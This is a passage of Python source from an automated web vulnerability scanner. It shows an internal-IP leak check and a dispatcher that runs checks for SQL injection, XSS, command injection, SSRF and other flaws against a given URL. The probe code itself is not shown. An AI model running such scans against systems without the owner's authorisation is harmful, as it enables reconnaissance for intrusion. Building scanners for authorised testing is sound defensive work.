        r = session.get(url, timeout=REQUEST_TIMEOUT)
        text = r.text
        ips = re.findall(
            r'(?:10\.\d{1,3}\.\d{1,3}\.\d{1,3}|'
            r'192\.168\.\d{1,3}\.\d{1,3}|'
            r'172\.(?:1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}|'
            r'fc00:[0-9a-f:]+)',
            text, re.IGNORECASE
        )
        if ips:
            print(" FOUND")
            for ip in set(ips):
                findings.append(f"Internal IP in response: {ip}")
        else:
            print(" OK")
    except Exception as e:
        print(f" ERROR ({e})")

    return findings


def check_all_vulnerabilities(base_url):
    """
    Runs all defined vulnerability checkers for the given base_url.
    Ensures base_url has a scheme.
    """
    # Ensure base_url has a scheme, as all checkers expect it.
    parsed_url = urlparse(base_url)
    if not parsed_url.scheme:
        print(f"[!] URL '{base_url}' for vulnerability checks is missing a scheme. Defaulting to 'http://'.")
        base_url = 'http://' + base_url
    
    print(f"\n--- Starting vulnerability checks for {base_url} ---")
    
    all_detected_vulnerabilities = []

    # List of all checker functions
    # Note: Some checkers might be noisy or produce false positives without further context.
    checkers = [
        check_sql_injection,
        check_xss,
        # check_csrf, # Kept out for now as it's too basic and might be misleading
        check_command_injection,
        check_file_inclusion,
        check_insecure_http_methods,
        # check_directory_traversal, # This is currently an alias for LFI, avoid duplicate runs unless logic differs
        check_server_info_disclosure,
        check_clickjacking,
        check_ssl_tls,
        check_open_redirect,
        check_subdomain_takeover,
        check_csrf,
        check_ssrf,
        check_rate_limiting,
        check_broken_access_control,
        check_security_misconfiguration,
        check_sensitive_data_exposure,
        check_cors_misconfiguration,
        check_unvalidated_redirects,
        check_missing_or_weak_auth,
        check_weak_password_policy,
        check_api_endpoint_exposure,
        check_internal_ips_in_responses

    ]
    
    for checker_func in checkers:
        checker_name = checker_func.__name__
        print(f"\n[*] Running {checker_name}...")
        try:
            # Each checker function is expected to return a string (single vulnerability message)
            # or a list of strings (multiple findings from that checker), or None.
            result = checker_func(base_url)
            
            if result:
                if isinstance(result, list):
                    print(f"[+] {checker_name} found {len(result)} issue(s).")
                    all_detected_vulnerabilities.extend(result)
                elif isinstance(result, str):
                    print(f"[+] {checker_name} found an issue.")
                    all_detected_vulnerabilities.append(result)
                # else: result is None or not a string/list, so ignore
            else:
                print(f"[-] {checker_name} found no issues.")

        except requests.exceptions.MissingSchema:
            # This should ideally be caught by the scheme check at the start of this function.
            err_msg = f"[!!!] Critical Error in {checker_name}: URL '{base_url}' is missing a schema (http:// or https://) despite prior checks. Skipping this check."
            print(err_msg)
            all_detected_vulnerabilities.append(err_msg) # Add error to report
        except requests.exceptions.ConnectionError as e:
            err_msg = f"[!] Connection Error in {checker_name} for {base_url}: {e}. Skipping this check."
            print(err_msg)
            all_detected_vulnerabilities.append(err_msg)
        except Exception as e:
            # Catch any other unexpected errors from a checker
            err_msg = f"[!] Unexpected error in {checker_name} for {base_url}: {e}. Skipping this check."
            print(err_msg)
            all_detected_vulnerabilities.append(err_msg) # Add error to report
            
    if not all_detected_vulnerabilities:
        print("\n--- No vulnerabilities conclusively identified by automated checks. ---")
    else:
        print(f"\n--- Finished vulnerability checks. Total potential issues found: {len(all_detected_vulnerabilities)} ---")
        
    return all_detected_vulnerabilities
